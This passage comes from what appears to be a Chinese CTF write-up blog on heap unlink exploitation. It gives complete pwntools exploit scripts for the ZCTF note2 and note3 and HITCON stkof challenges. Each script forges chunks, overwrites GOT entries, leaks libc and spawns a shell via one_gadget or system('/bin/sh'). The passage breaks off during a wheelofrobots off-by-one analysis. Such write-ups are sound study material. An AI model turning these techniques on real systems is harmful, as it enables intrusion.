class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">p = process(<span class="string">'./note2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'(less than 128)'</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id, choice, s)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line">    p.recvuntil(<span class="string">'2.append]'</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your name:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaaa"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input your address:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"bbbb"</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602120</span><span class="comment">#prt</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target <span class="number">-0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(fd)+p64(bk)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,payload)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'cccc'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload1+=p64(<span class="number">0x60</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload1)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi=elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload2 =<span class="string">'a'</span>*<span class="number">0x18</span>+p64(atoi)<span class="comment">#prt-0x18 start</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload2)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'is '</span>)</span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>))</span><br><span class="line">offset_addr=atoi_addr-libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(offset_addr)</span><br><span class="line"><span class="keyword">print</span> hex(atoi_addr)</span><br><span class="line">one_gadget=offset_addr+<span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(one_gadget))</span><br><span class="line">p.sendline(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-zctf-note3"><a href="#2016-zctf-note3" class="headerlink" title="2016 zctf note3"></a>2016 zctf note3</h2><p>和note2比，它就少了个show，但是我们可以利用puts函数来leak<br>就有就往fack_chunk里面写入free和puts两个函数的got值的操作，leak puts</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">sh=process(<span class="string">'./note3'</span>)</span><br><span class="line"><span class="comment"># sh=remote('127.0.0.1',9999)</span></span><br><span class="line">elf=ELF(<span class="string">'./note3'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'1024)\n'</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'content:\n'</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'note:\n'</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'ent:\n'</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'note:\n'</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6020c8</span><span class="comment">#prt</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target <span class="number">-0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(fd)+p64(bk)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,payload)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'cccc'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload1+=p64(<span class="number">0x60</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload1)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free=elf.got[<span class="string">'free'</span>]</span><br><span class="line">put_gots = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload2 =<span class="string">'a'</span>*<span class="number">0x18</span> + p64(free) + p64(put_gots)<span class="comment">#prt-0x18 start</span></span><br><span class="line">edit(<span class="number">0</span>,payload2)<span class="comment">#0</span></span><br><span class="line">puts_plt = elf.sym[<span class="string">'puts'</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(puts_plt)[:<span class="number">-1</span>]) <span class="comment"># 解决了只能包含“\n”只能发送八个字节的问题</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">"\nDelete success\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(one_gadget)[:<span class="number">-1</span>])</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"><span class="comment"># add(0x88,'aaaa')</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>另一种方法，是用了edit里面id的整数溢出，用复数使chunk可以直接overlap<br>然后改free的got为system（这个是把chunk0覆写成free got的地址，再edit一次0，就可以写system写进got表），再把binsh的地址写在原本是chunk0地址的地方，free的时候，拿chunk0当参数就可以实现system(‘/bin/sh’)（one_gadget其实更方便一点）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">sh=process(<span class="string">'./note3'</span>)</span><br><span class="line"><span class="comment"># sh=remote('127.0.0.1',9999)</span></span><br><span class="line">elf=ELF(<span class="string">'./note3'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'1024)\n'</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'content:\n'</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'note:\n'</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'ent:\n'</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'note:\n'</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">inter=<span class="number">-9223372036854775808</span></span><br><span class="line">payload=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x81</span>)</span><br><span class="line">payload+=p64(<span class="number">0x6020e0</span><span class="number">-0x18</span>)</span><br><span class="line">payload+=p64(<span class="number">0x6020e0</span><span class="number">-0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">'a'</span>)</span><br><span class="line">payload+=p64(<span class="number">0x80</span>)</span><br><span class="line">payload+=p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">editnote(<span class="number">3</span>,<span class="string">'a'</span>)</span><br><span class="line">editnote(inter,payload) <span class="comment">#editnote(-1,payload) 此時size為note6地址 改的是chunk3</span></span><br><span class="line">delnote(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">free_got=elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">atol_got=elf.got[<span class="string">'atol'</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">editnote(<span class="number">3</span>,p64(free_got)+p64(puts_got))</span><br><span class="line">editnote(<span class="number">0</span>,p64(puts_plt)[:<span class="number">-1</span>])</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">puts_adr=sh.recvuntil(<span class="string">'\nDelete success\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">puts_adr=u64(puts_adr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_adr: '</span>+hex(puts_adr)</span><br><span class="line"> </span><br><span class="line">libc_base=puts_adr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">sys_adr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_adr=libc_base+libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base: '</span>+hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'sys_adr: '</span>+hex(sys_adr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'binsh_adr: '</span>+hex(binsh_adr)</span><br><span class="line">editnote(<span class="number">0</span>,p64(sys_adr)[:<span class="number">-1</span>])</span><br><span class="line">editnote(<span class="number">3</span>,p64(binsh_adr)[:<span class="number">-1</span>]) <span class="comment">#作为chunk0,即free的参数</span></span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>学到的新技能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p64(puts_plt)[:-1]  # 解决了只能包含“\n”只能发送八个字节的问题</span><br></pre></td></tr></table></figure><h2 id="2014-hitcon-stkof"><a href="#2014-hitcon-stkof" class="headerlink" title="2014 hitcon stkof"></a>2014 hitcon stkof</h2><p>这题我一直绕的点在，target为什么要是chunk0+0x10，即chunk2的位置<br>在测试中，我们可以发现其实chunk1和chunk2之间是隔了0x400的，但chunk2和chunk3是相邻的<br>我们需要在chunk2中操作unlink，所以我们需要是 <code>chunk2 --&gt;fack_chunk(chunk2-0x18)</code>,所以target改为chunk2地址所在的位置（在何位置构造，指针则指向哪里）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"> </span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line"> </span><br><span class="line">sh = process(<span class="string">"./stkof"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./stkof"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,strings)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.sendline(str(len(strings)))</span><br><span class="line">    sh.send(strings)</span><br><span class="line">    sh.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.sym[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602140</span> + <span class="number">0x10</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)</span><br><span class="line">payload += p64(fd) +p64(bk)</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">edit(<span class="number">2</span>,payload)  <span class="comment">#在chunk2的地方修改，则要使fack指向全局指针存放chunk2处的地址，而非chunk0</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"OK"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8</span> + p64(free_got) + p64(puts_got)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">edit(<span class="number">0</span>,p64(puts_plt))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">'\nOK\n'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">onegadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(onegadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="2017-wheelofrobots"><a href="#2017-wheelofrobots" class="headerlink" title="2017 wheelofrobots"></a>2017 wheelofrobots</h2><p>这道题太混乱了，好复杂的一个程序啊，我看了老半天才稍微看懂这个程序是干嘛的</p><p>洞的话第一个应该是add里面choose之后输入那里</p><p>off by one</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sub_400D83(<span class="string">"Which robot do you want to add to the wheel?"</span>);</span><br><span class="line">printf(<span class="string">"Your choice :"</span>);</span><br><span class="line">memset(&amp;unk_603110, <span class="number">0</span>, <span class="number">4</span>uLL);</span><br><span class="line">v10 = sub_400A36(&amp;unk_603110, <span class="number">5L</span>L);   //可以多一个字节溢出，覆盖的地址在<span class="number">0x603114</span>的内容</span><br><span class="line"></span><br><span class="line">而<span class="number">0x603114</span>刚好是存放第二个robot状态的地址</span><br><span class="line"> case <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !dword_603114 )</span><br><span class="line">        &#123;</span><br><span class="line">          printf(<span class="string">"Increase Bender's intelligence: "</span>, <span class="number">5L</span>L);</span><br><span class="line">          memset(&amp;s, <span class="number">0</span>, <span class="number">5</span>uLL);</span><br><span class="line">          v8 = sub_400A36(&amp;s, <span class="number">5L</span>L);</span><br><span class="line">          <span class="keyword">if</span> ( v8 &gt; <span class="number">4</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            puts(<span class="string">"Sorry impossible to make bender as smart!"</span>);</span><br><span class="line">            v8 = <span class="number">2</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          qword_6030F0 = calloc(<span class="number">1</span>uLL, <span class="number">20</span> * v8);</span><br><span class="line">          qword_603138 = v8;</span><br><span class="line">          dword_603114 = <span class="number">1</span>;</span><br><span class="line">          v1 = qword_6030F0;</span><br><span class="line">          *(_DWORD *)qword_6030F0 = <span class="string">'dneB'</span>;</span><br><span class="line">          v1[<span class="number">2</span>] = <span class="string">'re'</span>;</span><br><span class="line">          *((_BYTE *)v1 + <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">          ++qword_603130;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>我们可以通过更改bender的状态做到不add直接change<br>然后我们可以发现这几个robots之间错综复杂的关系，就可以构造face_chunk,实现unlink</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">case <span class="number">1</span>u:</span><br><span class="line">      result = (unsigned int)dword_603120;</span><br><span class="line">      <span class="keyword">if</span> ( dword_603120 )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(<span class="string">"Robot's name: "</span>);</span><br><span class="line">        result = read(<span class="number">0</span>, buf, <span class="number">0x14</span>uLL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">.bss:<span class="number">00000000006030</span>F8 ; void *buf</span><br><span class="line">.bss:00000000006030F8 buf             dq ?                    ; DATA XREF: sub_400DF8+A6↑w</span><br><span class="line">.bss:<span class="number">00000000006030</span>F8                                         ; sub_400DF8+B7↑r ...      </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">case <span class="number">6</span>u:</span><br><span class="line">      result = (unsigned int)dword_60311C;</span><br><span class="line">      <span class="keyword">if</span> ( dword_60311C )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(<span class="string">"Robot's name: 